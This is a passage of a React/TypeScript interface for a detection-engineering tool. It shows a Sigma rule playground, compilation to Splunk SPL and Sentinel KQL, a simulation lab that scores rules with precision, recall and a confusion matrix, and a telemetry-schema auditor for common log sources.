                      className="mt-3 w-full bg-gradient-to-r from-emerald-500 to-teal-600 hover:brightness-110 disabled:opacity-50 text-white font-bold text-xs py-2.5 rounded-lg transition-all shadow-lg shadow-emerald-500/20 flex items-center justify-center gap-1.5 cursor-pointer"
                    >
                      📥 Register & Deploy to Active Rules Registry
                    </button>
                  </div>
                </div>

                {/* Column 2: Compiled SIEM Queries - Span 4 */}
                <div className="xl:col-span-4 flex flex-col gap-6">
                  {/* Splunk Compiler Output */}
                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-5 flex flex-col backdrop-blur-xl">
                    <div className="flex justify-between items-center mb-3">
                      <span className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-1.5">
                        <span>🪵</span> Splunk SPL Query
                      </span>
                      <button
                        id="playground-splunk-copy"
                        onClick={() => handleCopyCommand(splunkQuery, "playground-splunk-copy")}
                        disabled={!!parseError || !splunkQuery}
                        className="text-[0.68rem] bg-slate-900 border border-slate-800 hover:border-slate-700 text-slate-300 font-semibold px-2 py-1 rounded transition-all cursor-pointer disabled:opacity-50"
                      >
                        Copy
                      </button>
                    </div>
                    <pre className="bg-[#05070c] border border-slate-800/80 p-4 rounded-xl text-[0.72rem] font-mono text-cyan-400 overflow-x-auto whitespace-pre-wrap leading-relaxed min-h-[140px] select-all">
                      {parseError ? "--- Compilation paused due to YAML validation error ---" : splunkQuery || "--- Awaiting compilation ---"}
                    </pre>
                  </div>

                  {/* KQL Compiler Output */}
                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-5 flex flex-col backdrop-blur-xl">
                    <div className="flex justify-between items-center mb-3">
                      <span className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-1.5">
                        <span>☁️</span> Sentinel KQL Query
                      </span>
                      <button
                        id="playground-kql-copy"
                        onClick={() => handleCopyCommand(kqlQuery, "playground-kql-copy")}
                        disabled={!!parseError || !kqlQuery}
                        className="text-[0.68rem] bg-slate-900 border border-slate-800 hover:border-slate-700 text-slate-300 font-semibold px-2 py-1 rounded transition-all cursor-pointer disabled:opacity-50"
                      >
                        Copy
                      </button>
                    </div>
                    <pre className="bg-[#05070c] border border-slate-800/80 p-4 rounded-xl text-[0.72rem] font-mono text-purple-300 overflow-x-auto whitespace-pre-wrap leading-relaxed min-h-[140px] select-all">
                      {parseError ? "--- Compilation paused due to YAML validation error ---" : kqlQuery || "--- Awaiting compilation ---"}
                    </pre>
                  </div>

                  {/* Rule details meta box */}
                  {parsedRule && !parseError && (
                    <div className="bg-[#0d111c]/50 border border-slate-800/60 rounded-2xl p-5 text-xs text-slate-400 flex flex-col gap-3">
                      <h4 className="font-bold text-slate-300 uppercase tracking-wider">Detection Parameters</h4>
                      <div>
                        <span className="text-slate-500">Title:</span> <span className="text-slate-200 font-medium">{parsedRule.title}</span>
                      </div>
                      <div>
                        <span className="text-slate-500">Severity:</span> <span className={`font-semibold capitalize ${parsedRule.severity === 'critical' ? 'text-rose-400' : parsedRule.severity === 'high' ? 'text-amber-400' : 'text-blue-400'}`}>{parsedRule.severity}</span>
                      </div>
                      <div>
                        <span className="text-slate-500">Logsource:</span> <span className="text-slate-300 font-mono bg-slate-900 px-1.5 py-0.5 rounded border border-slate-800">{parsedRule.logsource.product || 'any'}:{parsedRule.logsource.service || 'any'}</span>
                      </div>
                    </div>
                  )}
                </div>

                {/* Column 3: Event Log Simulator - Span 4 */}
                <div className="xl:col-span-4 flex flex-col gap-5">
                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-5 flex flex-col backdrop-blur-xl flex-1">
                    <span className="text-xs font-bold text-slate-400 uppercase tracking-wider block mb-3">
                      Event Log Simulator (JSON)
                    </span>
                    <textarea
                      value={playgroundLog}
                      onChange={(e) => setPlaygroundLog(e.target.value)}
                      className="flex-grow w-full bg-[#05070c] border border-slate-800 rounded-xl p-4 text-[0.72rem] font-mono text-cyan-400 focus:outline-none focus:border-indigo-500 resize-none h-[220px]"
                      placeholder="Paste simulation telemetry log here..."
                    />

                    <button
                      onClick={handleEvaluatePlayground}
                      disabled={!!parseError}
                      className="mt-4 w-full bg-gradient-to-r from-indigo-500 to-purple-600 hover:brightness-110 disabled:opacity-50 text-white font-bold text-xs py-3 rounded-lg transition-all shadow-lg shadow-indigo-500/20 flex items-center justify-center gap-1.5 cursor-pointer"
                    >
                      ⚡ Evaluate Detection Logic
                    </button>
                  </div>

                  {/* Evaluation output feedback panel */}
                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-5 backdrop-blur-xl flex flex-col gap-3">
                    <span className="text-xs font-bold text-slate-400 uppercase tracking-wider block">
                      Simulation Outcome
                    </span>

                    {!playgroundEvaluationResult.evaluated ? (
                      <div className="bg-slate-900/40 border border-slate-800/80 p-4 rounded-xl text-center text-xs text-slate-500">
                        Awaiting evaluation trigger...
                      </div>
                    ) : playgroundEvaluationResult.error ? (
                      <div className="bg-rose-950/20 border border-rose-500/30 text-rose-400 p-4 rounded-xl text-xs font-mono">
                        ⚠️ Evaluation Error:<br />
                        {playgroundEvaluationResult.error}
                      </div>
                    ) : playgroundEvaluationResult.triggered ? (
                      <div className="bg-emerald-950/20 border border-emerald-500/40 p-4 rounded-xl flex flex-col gap-2">
                        <div className="text-emerald-400 font-bold text-xs flex items-center gap-1.5">
                          <span className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-ping"></span>
                          ✅ Alert Triggered Successfully!
                        </div>
                        <p className="text-[0.7rem] text-slate-400 leading-normal">
                          The log matching selectors satisfied the rule's boolean condition: <span className="font-mono text-emerald-300">({parsedRule?.detection.condition})</span>. This event would trigger an active alert in the SIEM pipeline.
                        </p>
                      </div>
                    ) : (
                      <div className="bg-slate-900/60 border border-slate-800/80 p-4 rounded-xl flex flex-col gap-2">
                        <div className="text-slate-400 font-bold text-xs flex items-center gap-1.5">
                          <span className="w-2.5 h-2.5 rounded-full bg-slate-500"></span>
                          ❌ Alert Suppressed / Ignored
                        </div>
                        <p className="text-[0.7rem] text-slate-500 leading-normal">
                          The log details did not trigger the detection criteria. The rule condition <span className="font-mono">({parsedRule?.detection.condition})</span> evaluated to false. No alert generated.
                        </p>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </>
          );
        })()}

        {/* Active Tab: SIEM COMPILER */}
        {activeTab === 'compiler' && (() => {
          const selectedRule = registeredRules.find(r => r.id === selectedRuleIdCompiler) || registeredRules[0];
          const splunkQuery = compileToSplunk(selectedRule);
          const kqlQuery = compileToKql(selectedRule);
          
          return (
            <>
              <header className="border-b border-slate-800/60 pb-5">
                <h2 className="text-2xl font-bold tracking-tight text-white mb-1 flex items-center gap-2">
                  🛠️ SIEM Compiler Pipeline
                </h2>
                <p className="text-slate-400 text-sm max-w-4xl">
                  Write detections once in Sigma YAML format, and compile them instantly to high-performance Splunk SPL or Sentinel KQL queries.
                </p>
              </header>

              <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
                {/* Left Column: Rule Selection & YAML Viewer (Span 5) */}
                <div className="lg:col-span-5 flex flex-col gap-6">
                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6 backdrop-blur-xl">
                    <label htmlFor="compiler-rule-select" className="text-xs font-bold text-slate-400 uppercase tracking-wider block mb-3">
                      Select Detection Rule
                    </label>
                    <select 
                      id="compiler-rule-select"
                      value={selectedRuleIdCompiler}
                      onChange={(e) => setSelectedRuleIdCompiler(e.target.value)}
                      className="w-full bg-[#05070c] border border-slate-800 text-slate-200 rounded-lg p-2.5 text-xs focus:outline-none focus:border-indigo-500 cursor-pointer"
                    >
                      {registeredRules.map(r => (
                        <option key={r.id} value={r.id}>{r.title}</option>
                      ))}
                    </select>
                  </div>

                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6 flex-1 flex flex-col backdrop-blur-xl">
                    <div className="flex justify-between items-center mb-4">
                      <span className="text-xs font-bold text-slate-400 uppercase tracking-wider">Sigma YAML Spec</span>
                      <button 
                        id="copy-yaml-btn"
                        onClick={() => handleCopyCommand(selectedRule.yaml_string, "copy-yaml-btn")}
                        className="text-[0.7rem] bg-slate-900 border border-slate-800 text-slate-400 hover:text-white hover:border-slate-700 font-semibold px-2.5 py-1 rounded transition-all cursor-pointer"
                      >
                        Copy YAML
                      </button>
                    </div>
                    <pre className="flex-1 bg-[#05070c] border border-slate-800/80 p-4 rounded-xl text-[0.72rem] font-mono text-indigo-300 overflow-x-auto whitespace-pre leading-relaxed select-all">
                      {selectedRule.yaml_string}
                    </pre>
                  </div>
                </div>

                {/* Right Column: Compiled Target SIEMs (Span 7) */}
                <div className="lg:col-span-7 flex flex-col gap-6">
                  {/* Metadata Card */}
                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6 backdrop-blur-xl flex flex-col gap-4">
                    <div className="flex items-center justify-between">
                      <span className={`text-[0.62rem] font-bold uppercase tracking-wider px-2 py-0.5 rounded border ${selectedRule.severity === 'critical' ? 'bg-rose-500/10 text-rose-400 border-rose-500/20' : selectedRule.severity === 'high' ? 'bg-amber-500/10 text-amber-400 border-amber-500/20' : 'bg-blue-500/10 text-blue-400 border-blue-500/20'}`}>
                        {selectedRule.severity} Severity
                      </span>
                      <span className="text-[0.7rem] text-slate-500 font-mono">Status: <span className="text-emerald-400">{selectedRule.status}</span></span>
                    </div>
                    <div>
                      <h3 className="text-lg font-bold text-white mb-2">{selectedRule.title}</h3>
                      <p className="text-slate-400 text-xs leading-relaxed">{selectedRule.description}</p>
                    </div>
                    <div className="flex flex-wrap gap-2 pt-2 border-t border-slate-800/50 text-[0.7rem] text-slate-400">
                      <span className="font-mono bg-slate-900 border border-slate-800 px-2 py-0.5 rounded">Category: {selectedRule.logsource.category}</span>
                      <span className="font-mono bg-slate-900 border border-slate-800 px-2 py-0.5 rounded">Product: {selectedRule.logsource.product}</span>
                      <span className="font-mono bg-slate-900 border border-slate-800 px-2 py-0.5 rounded">Service: {selectedRule.logsource.service}</span>
                    </div>
                  </div>

                  {/* Splunk Block */}
                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6 backdrop-blur-xl flex flex-col">
                    <div className="flex justify-between items-center mb-3">
                      <div className="flex items-center gap-2">
                        <span className="text-lg">🪵</span>
                        <span className="text-xs font-bold text-slate-300 uppercase tracking-wider">Compiled Splunk SPL</span>
                      </div>
                      <button 
                        id="copy-splunk-btn"
                        onClick={() => handleCopyCommand(splunkQuery, "copy-splunk-btn")}
                        className="text-[0.7rem] bg-indigo-600 hover:bg-indigo-500 border border-indigo-500/30 text-white font-semibold px-2.5 py-1 rounded transition-all cursor-pointer"
                      >
                        Copy Query
                      </button>
                    </div>
                    <pre className="bg-[#05070c] border border-slate-800/80 p-4 rounded-xl text-[0.72rem] font-mono text-cyan-400 overflow-x-auto whitespace-pre-wrap leading-relaxed select-all">
                      {splunkQuery}
                    </pre>
                  </div>

                  {/* KQL Block */}
                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6 backdrop-blur-xl flex flex-col">
                    <div className="flex justify-between items-center mb-3">
                      <div className="flex items-center gap-2">
                        <span className="text-lg">☁️</span>
                        <span className="text-xs font-bold text-slate-300 uppercase tracking-wider">Compiled Microsoft Sentinel KQL</span>
                      </div>
                      <button 
                        id="copy-kql-btn"
                        onClick={() => handleCopyCommand(kqlQuery, "copy-kql-btn")}
                        className="text-[0.7rem] bg-indigo-600 hover:bg-indigo-500 border border-indigo-500/30 text-white font-semibold px-2.5 py-1 rounded transition-all cursor-pointer"
                      >
                        Copy Query
                      </button>
                    </div>
                    <pre className="bg-[#05070c] border border-slate-800/80 p-4 rounded-xl text-[0.72rem] font-mono text-purple-300 overflow-x-auto whitespace-pre-wrap leading-relaxed select-all">
                      {kqlQuery}
                    </pre>
                  </div>
                </div>
              </div>
            </>
          );
        })()}

        {/* Active Tab: SIMULATION LAB */}
        {activeTab === 'validation' && (() => {
          const selectedRule = registeredRules.find(r => r.id === selectedRuleIdValidation) || registeredRules[0];
          const dataset = registryTelemetry[selectedRule.id] || [];
          
          const handleRunValidation = () => {
            setEmulationRunning(true);
            setTimeout(() => {
              const report = runValidation(selectedRule, dataset);
              setValidationReport(report);
              setEmulationRunning(false);
            }, 600);
          };

          return (
            <>
              <header className="border-b border-slate-800/60 pb-5">
                <h2 className="text-2xl font-bold tracking-tight text-white mb-1 flex items-center gap-2">
                  🧪 Simulation & Validation Lab
                </h2>
                <p className="text-slate-400 text-sm max-w-4xl">
                  Audit rule logic accuracy. Execute detection rules locally against mock purple team attack datasets to compute Precision, Recall, and Confusion Matrices.
                </p>
              </header>

              <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
                {/* Left Column: Select rule & Launch (Span 4) */}
                <div className="lg:col-span-4 flex flex-col gap-6">
                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6 backdrop-blur-xl">
                    <label htmlFor="validation-rule-select" className="text-xs font-bold text-slate-400 uppercase tracking-wider block mb-3">
                      Select Rule to Validate
                    </label>
                    <select 
                      id="validation-rule-select"
                      value={selectedRuleIdValidation}
                      onChange={(e) => {
                        setSelectedRuleIdValidation(e.target.value);
                        setValidationReport(null); // Reset report when changing rule
                      }}
                      className="w-full bg-[#05070c] border border-slate-800 text-slate-200 rounded-lg p-2.5 text-xs focus:outline-none focus:border-indigo-500 cursor-pointer"
                    >
                      {registeredRules.map(r => (
                        <option key={r.id} value={r.id}>{r.title}</option>
                      ))}
                    </select>

                    {isEditingDataset ? (
                      <div className="mt-4 flex flex-col gap-3 border-t border-slate-800/60 pt-4">
                        <label htmlFor="dataset-json-textarea" className="text-[0.68rem] text-slate-500 uppercase tracking-wider font-semibold block">
                          Edit Test Dataset (JSON Array)
                        </label>
                        <textarea
                          id="dataset-json-textarea"
                          value={datasetJsonText}
                          onChange={(e) => setDatasetJsonText(e.target.value)}
                          className="w-full h-48 bg-[#05070c] border border-slate-800 rounded-lg p-2.5 text-cyan-400 font-mono text-[0.7rem] focus:outline-none focus:border-indigo-500 resize-y leading-relaxed"
                          placeholder="[\n  {\n    &quot;EventID&quot;: 1,\n    &quot;label&quot;: &quot;malicious&quot;,\n    ...\n  }\n]"
                        />
                        <div className="flex gap-2">
                          <button
                            onClick={handleSaveDataset}
                            className="flex-grow bg-emerald-600 hover:bg-emerald-500 text-white text-[0.68rem] font-bold py-2 rounded transition-all cursor-pointer"
                          >
                            Save Changes
                          </button>
                          <button
                            onClick={() => {
                              const dataset = registryTelemetry[selectedRuleIdValidation] || [];
                              setDatasetJsonText(JSON.stringify(dataset, null, 2));
                              setIsEditingDataset(false);
                            }}
                            className="flex-grow bg-slate-900 border border-slate-800 hover:border-slate-700 text-slate-300 text-[0.68rem] font-bold py-2 rounded transition-all cursor-pointer"
                          >
                            Cancel
                          </button>
                        </div>
                      </div>
                    ) : (
                      <>
                        <div className="mt-5 pt-5 border-t border-slate-800/60 text-xs text-slate-400 flex flex-col gap-3">
                          <div className="flex justify-between">
                            <span>Ingested Test Events:</span>
                            <span className="font-mono text-slate-200">{dataset.length} logs</span>
                          </div>
                          <div className="flex justify-between">
                            <span>Malicious Events:</span>
                            <span className="font-mono text-rose-400">{dataset.filter(d => d.label === 'malicious').length} logs</span>
                          </div>
                          <div className="flex justify-between">
                            <span>Benign Events:</span>
                            <span className="font-mono text-emerald-400">{dataset.filter(d => d.label === 'benign').length} logs</span>
                          </div>
                        </div>

                        <div className="flex gap-2 mt-4">
                          <button
                            onClick={() => setIsEditingDataset(true)}
                            className="w-full bg-slate-900 border border-slate-800 hover:border-slate-700 text-slate-300 text-xs py-2 rounded-lg font-semibold flex items-center justify-center gap-1.5 transition-all cursor-pointer"
                          >
                            ✏️ Edit Test Dataset
                          </button>
                        </div>
                      </>
                    )}

                    <button 
                      onClick={handleRunValidation}
                      disabled={emulationRunning || isEditingDataset}
                      className="mt-6 w-full bg-gradient-to-r from-indigo-500 to-purple-600 hover:brightness-110 disabled:opacity-50 text-white font-bold text-xs py-3 rounded-lg transition-all shadow-lg shadow-indigo-500/20 flex items-center justify-center gap-2 cursor-pointer"
                    >
                      {emulationRunning ? (
                        <>
                          <span className="animate-spin text-sm">⏳</span> Running Simulation...
                        </>
                      ) : (
                        <>
                          ⚡ Run Emulation Test
                        </>
                      )}
                    </button>
                  </div>

                  {/* Diagnostics info */}
                  <div className="bg-[#0f1322]/40 border border-slate-800/60 rounded-2xl p-5 text-xs text-slate-400 leading-relaxed">
                    <h4 className="font-bold text-slate-200 mb-2 flex items-center gap-1">
                      <span>ℹ️</span> Validation Methodologies
                    </h4>
                    <p className="mb-2">
                      Our emulation pipeline parses the logic condition fields inside a Sigma rule dynamically and executes them directly against each log entry within the mock dataset.
                    </p>
                    <p>
                      It compares outcomes to the pre-configured ground truth label to calculate false alarms, missed alerts, and total accuracy score ratios.
                    </p>
                  </div>
                </div>

                {/* Right Column: Emulation Results (Span 8) */}
                <div className="lg:col-span-8 flex flex-col gap-6">
                  {!validationReport ? (
                    <div className="bg-[#0d111c]/40 border border-dashed border-slate-800 rounded-2xl p-12 text-center text-slate-500 flex flex-col items-center gap-3 justify-center min-h-[400px]">
                      <span className="text-4xl">🧪</span>
                      <p className="text-sm">Select a rule and click "Run Emulation Test" to analyze logic health.</p>
                    </div>
                  ) : (
                    <>
                      {/* Performance Metrics Row */}
                      <div className="grid grid-cols-3 gap-4">
                        <div className="bg-[#0f1322]/80 border border-slate-800/60 p-5 rounded-2xl relative overflow-hidden">
                          <span className="text-[0.62rem] font-bold text-slate-400 uppercase tracking-wider block">Precision Rate</span>
                          <span className="text-2xl font-bold mt-1 block font-mono text-sky-400">{Math.round(validationReport.precision * 100)}%</span>
                          <p className="text-[0.62rem] text-slate-500 mt-1">Ratio of real alerts to total triggers.</p>
                          <div className="absolute bottom-0 left-0 w-full h-[3px] bg-sky-400"></div>
                        </div>
                        <div className="bg-[#0f1322]/80 border border-slate-800/60 p-5 rounded-2xl relative overflow-hidden">
                          <span className="text-[0.62rem] font-bold text-slate-400 uppercase tracking-wider block">Recall Rate</span>
                          <span className="text-2xl font-bold mt-1 block font-mono text-purple-400">{Math.round(validationReport.recall * 100)}%</span>
                          <p className="text-[0.62rem] text-slate-500 mt-1">Ratio of captured threats to total threats.</p>
                          <div className="absolute bottom-0 left-0 w-full h-[3px] bg-purple-400"></div>
                        </div>
                        <div className="bg-[#0f1322]/80 border border-slate-800/60 p-5 rounded-2xl relative overflow-hidden">
                          <span className="text-[0.62rem] font-bold text-slate-400 uppercase tracking-wider block">F1-Score Accuracy</span>
                          <span className="text-2xl font-bold mt-1 block font-mono text-emerald-400">{Math.round(validationReport.f1_score * 100)}%</span>
                          <p className="text-[0.62rem] text-slate-500 mt-1">Harmonic mean of precision & recall.</p>
                          <div className="absolute bottom-0 left-0 w-full h-[3px] bg-emerald-400"></div>
                        </div>
                      </div>

                      {/* Confusion Matrix Panel */}
                      <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6">
                        <h3 className="text-sm font-bold text-slate-300 uppercase tracking-wider mb-4">
                          Confusion Matrix
                        </h3>
                        
                        <div className="grid grid-cols-3 gap-3 text-center text-xs">
                          {/* Empty corner */}
                          <div></div>
                          <div className="font-bold text-slate-400 pb-1 uppercase tracking-wide">Threat (Label: Malicious)</div>
                          <div className="font-bold text-slate-400 pb-1 uppercase tracking-wide">Noise (Label: Benign)</div>

                          <div className="font-bold text-slate-400 flex items-center justify-center uppercase tracking-wide">Triggered (Alert)</div>
                          <div className="bg-emerald-950/20 border border-emerald-500/40 p-4 rounded-xl">
                            <span className="text-2xl font-mono font-bold text-emerald-400 block">{validationReport.true_positives}</span>
                            <span className="text-[0.62rem] text-emerald-300 font-semibold">True Positive (TP)</span>
                          </div>
                          <div className="bg-rose-950/20 border border-rose-500/40 p-4 rounded-xl">
                            <span className="text-2xl font-mono font-bold text-rose-400 block">{validationReport.false_positives}</span>
                            <span className="text-[0.62rem] text-rose-300 font-semibold">False Positive (FP)</span>
                          </div>

                          <div className="font-bold text-slate-400 flex items-center justify-center uppercase tracking-wide">Ignored (Silence)</div>
                          <div className="bg-amber-950/20 border border-amber-500/40 p-4 rounded-xl">
                            <span className="text-2xl font-mono font-bold text-amber-400 block">{validationReport.false_negatives}</span>
                            <span className="text-[0.62rem] text-amber-300 font-semibold">False Negative (FN)</span>
                          </div>
                          <div className="bg-slate-900 border border-slate-800 p-4 rounded-xl">
                            <span className="text-2xl font-mono font-bold text-slate-400 block">{validationReport.true_negatives}</span>
                            <span className="text-[0.62rem] text-slate-400 font-semibold">True Negative (TN)</span>
                          </div>
                        </div>
                      </div>

                      {/* Event Logs Trace Output */}
                      <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6">
                        <h3 className="text-sm font-bold text-slate-300 uppercase tracking-wider mb-4">
                          Emulation Event Log Trace
                        </h3>
                        
                        <div className="flex flex-col gap-2.5 max-h-[300px] overflow-y-auto pr-1">
                          {dataset.map((rec, index) => {
                            const triggered = evaluateRuleAgainstRecord(selectedRule, rec);
                            const label = rec.label || 'benign';
                            
                            let statusText = "True Negative";
                            let badgeClass = "bg-slate-800 text-slate-400 border border-slate-700/50";
                            if (triggered && label === 'malicious') {
                              statusText = "True Positive";
                              badgeClass = "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20";
                            } else if (triggered && label === 'benign') {
                              statusText = "False Positive (Noise Alert)";
                              badgeClass = "bg-rose-500/10 text-rose-400 border border-rose-500/20";
                            } else if (!triggered && label === 'malicious') {
                              statusText = "False Negative (Missed Threat)";
                              badgeClass = "bg-amber-500/10 text-amber-400 border border-amber-500/20";
                            }

                            return (
                              <div key={index} className="bg-[#05070c]/60 border border-slate-800/60 p-3 rounded-lg flex flex-col sm:flex-row justify-between gap-3 text-xs">
                                <div className="flex flex-col gap-1 min-w-0">
                                  <span className="font-mono text-slate-300 truncate">
                                    {JSON.stringify(rec)}
                                  </span>
                                  <span className="text-[0.62rem] text-slate-500">
                                    Ground Truth: <span className={label === 'malicious' ? 'text-rose-400' : 'text-emerald-400'}>{label.toUpperCase()}</span>
                                  </span>
                                </div>
                                <div className="shrink-0 self-end sm:self-center">
                                  <span className={`px-2 py-0.5 rounded text-[0.62rem] font-bold ${badgeClass}`}>
                                    {statusText}
                                  </span>
                                </div>
                              </div>
                            );
                          })}
                        </div>
                      </div>
                    </>
                  )}
                </div>
              </div>
            </>
          );
        })()}

        {/* Active Tab: TELEMETRY HEALTH AUDITOR */}
        {activeTab === 'telemetry_audit' && (() => {
          const handleRunAudit = () => {
            try {
              const parsed = JSON.parse(auditJsonInput);
              const report = analyzeLogQuality(selectedSourceType, parsed);
              setAuditReport(report);
            } catch (e: any) {
              alert(`Invalid JSON: ${e.message}`);
            }
          };

          return (
            <>
              <header className="border-b border-slate-800/60 pb-5">
                <h2 className="text-2xl font-bold tracking-tight text-white mb-1 flex items-center gap-2">
                  📊 Telemetry Health Auditor
                </h2>
                <p className="text-slate-400 text-sm max-w-4xl">
                  Evaluate your log source health schema against security engineering requirements. Identify missing telemetry fields that break threat hunting queries and alerts.
                </p>
              </header>

              <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
                {/* Left Column: Input Payload Editor (Span 5) */}
                <div className="lg:col-span-5 flex flex-col gap-6">
                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6 backdrop-blur-xl">
                    <label htmlFor="auditor-source-select" className="text-xs font-bold text-slate-400 uppercase tracking-wider block mb-3">
                      Select Log Source Type
                    </label>
                    <select 
                      id="auditor-source-select"
                      value={selectedSourceType}
                      onChange={(e) => setSelectedSourceType(e.target.value)}
                      className="w-full bg-[#05070c] border border-slate-800 text-slate-200 rounded-lg p-2.5 text-xs focus:outline-none focus:border-indigo-500 cursor-pointer"
                    >
                      <option value="sysmon">Windows Sysmon Process Event</option>
                      <option value="active_directory">Active Directory Security Log</option>
                      <option value="azure_entra">Entra ID (Azure AD) Audit Logs</option>
                      <option value="aws">AWS CloudTrail Log</option>
                      <option value="dns">DNS Query Resolver Log</option>
                    </select>
                  </div>

                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6 flex-1 flex flex-col backdrop-blur-xl">
                    <div className="flex justify-between items-center mb-3">
                      <span className="text-xs font-bold text-slate-400 uppercase tracking-wider">Raw Log JSON payload</span>
                      <button 
                        onClick={() => {
                          const sourceToRuleMap: Record<string, string> = {
                            sysmon: "5b4e13d9-9fb2-47de-9852-ff14b9c1d3c5",
                            active_directory: "c46f772e-d00f-48d6-953e-52ebc2b7ab7f",
                            azure_entra: "e4617a22-38e2-411a-8bb7-09d57a9e0f6b",
                            aws: "a24d8b99-a411-4824-9b2d-cf211a7a13fb",
                            dns: "d8d74542-a8b2-4d26-bb21-1d361c47a544"
                          };
                          const defaultRuleId = sourceToRuleMap[selectedSourceType];
                          const defaultLog = registryTelemetry[defaultRuleId]?.[0] || {};
                          const { label, ...cleanLog } = defaultLog;
                          setAuditJsonInput(JSON.stringify(cleanLog, null, 2));
                          setAuditReport(null);
                        }}
                        className="text-[0.66rem] text-indigo-400 hover:text-indigo-300 font-semibold cursor-pointer"
                      >
                        Reset to Default
                      </button>
                    </div>
                    
                    <textarea 
                      id="auditor-json-input"
                      value={auditJsonInput}
                      onChange={(e) => setAuditJsonInput(e.target.value)}
                      className="w-full flex-1 min-h-[300px] bg-[#05070c] border border-slate-800/80 rounded-xl p-4 text-cyan-400 font-mono text-[0.72rem] focus:outline-none focus:border-indigo-500 resize-none leading-relaxed"
                    />

                    <button 
                      onClick={handleRunAudit}
                      className="mt-4 w-full bg-gradient-to-r from-indigo-500 to-purple-600 hover:brightness-110 text-white font-bold text-xs py-3 rounded-lg transition-all shadow-lg shadow-indigo-500/20 cursor-pointer"
                    >
                      ⚡ Audit Telemetry Payload
                    </button>
                  </div>
                </div>

                {/* Right Column: Audit Score & Feedback (Span 7) */}
                <div className="lg:col-span-7 flex flex-col gap-6">
                  {!auditReport ? (
                    <div className="bg-[#0d111c]/40 border border-dashed border-slate-800 rounded-2xl p-12 text-center text-slate-500 flex flex-col items-center gap-3 justify-center min-h-[400px]">
                      <span className="text-4xl">📊</span>
                      <p className="text-sm">Provide a JSON log payload and click "Audit" to run the gap parser.</p>
                    </div>
                  ) : (
                    <>
                      {/* Score Gauge */}
                      <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6 backdrop-blur-xl">
                        <div className="flex justify-between items-center mb-4">
                          <div>
                            <h3 className="font-bold text-white text-base">{auditReport.log_source_name}</h3>
                            <span className="text-xs text-slate-500">Schema conformance checklist</span>
                          </div>
                          <div className="text-right">
                            <span className={`text-xs font-bold uppercase tracking-wider px-2 py-0.5 rounded border ${auditReport.status === 'HEALTHY' ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20' : auditReport.status === 'WARNING' ? 'bg-amber-500/10 text-amber-400 border-amber-500/20' : 'bg-rose-500/10 text-rose-400 border-rose-500/20'}`}>
                              {auditReport.status}
                            </span>
                          </div>
                        </div>

                        <div className="flex items-center gap-4">
                          <div className="w-full bg-[#05070c] rounded-full h-3 border border-slate-800">
                            <div 
                              className={`h-2.5 rounded-full ${auditReport.health_score >= 80 ? 'bg-emerald-500' : auditReport.health_score >= 50 ? 'bg-amber-500' : 'bg-rose-500'}`} 
                              style={{ width: `${auditReport.health_score}%` }}
                            />
                          </div>
                          <span className="text-lg font-mono font-bold text-white shrink-0">{auditReport.health_score}%</span>
                        </div>
                      </div>

                      {/* Conformance Table */}
                      <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6 backdrop-blur-xl">
                        <h3 className="text-xs font-bold text-slate-300 uppercase tracking-wider mb-4">
                          Telemetry Checklist Analysis
                        </h3>
                        
                        <div className="flex flex-col gap-3">
                          {auditReport.checked_fields.map((f: any) => (
                            <div key={f.field} className="bg-[#05070c]/50 border border-slate-800/60 p-3.5 rounded-xl flex items-start sm:items-center justify-between gap-4 text-xs">
                              <div className="flex flex-col gap-1 min-w-0">
                                <span className="font-bold text-slate-200 font-mono text-[0.74rem] flex items-center gap-1.5">
                                  {f.field}
                                  <span className={`text-[0.62rem] px-1.5 py-0.2 rounded border ${f.status === 'Present' ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20' : 'bg-rose-500/10 text-rose-400 border-rose-500/20'}`}>
                                    {f.status}
                                  </span>
                                </span>
                                <span className="text-[0.68rem] text-slate-400 leading-normal">{f.description}</span>
                                {f.status === 'Present' && (
                                  <span className="text-[0.68rem] text-cyan-400 font-mono mt-1 block truncate">
                                    Value: <span className="bg-black/30 px-1 py-0.5 rounded border border-slate-800/60">{f.value}</span>
                                  </span>
                                )}
                              </div>
                              <div className="shrink-0">
                                {f.status === 'Present' ? (
                                  <span className="text-emerald-400 text-lg">✅</span>
                                ) : (
                                  <span className="text-rose-400 text-lg">❌</span>
                                )}
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>

                      {/* Remediation & Diagnostics */}
                      {auditReport.missing_fields.length > 0 && (
                        <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6 backdrop-blur-xl flex flex-col gap-4">
                          <h3 className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-2">
                            🛠️ Remediation & Diagnostic Guides
                          </h3>

                          <p className="text-xs text-slate-400 leading-normal">
                            To capture the missing fields (<span className="font-mono text-rose-300">{auditReport.missing_fields.join(', ')}</span>), apply the following configurations in your environment:
                          </p>

                          <div className="bg-[#05070c]/60 border border-slate-800/50 p-4 rounded-xl flex flex-col gap-2">
                            <span className="text-xs font-bold text-indigo-300">🖥️ Group Policy / Diagnostic Setting</span>
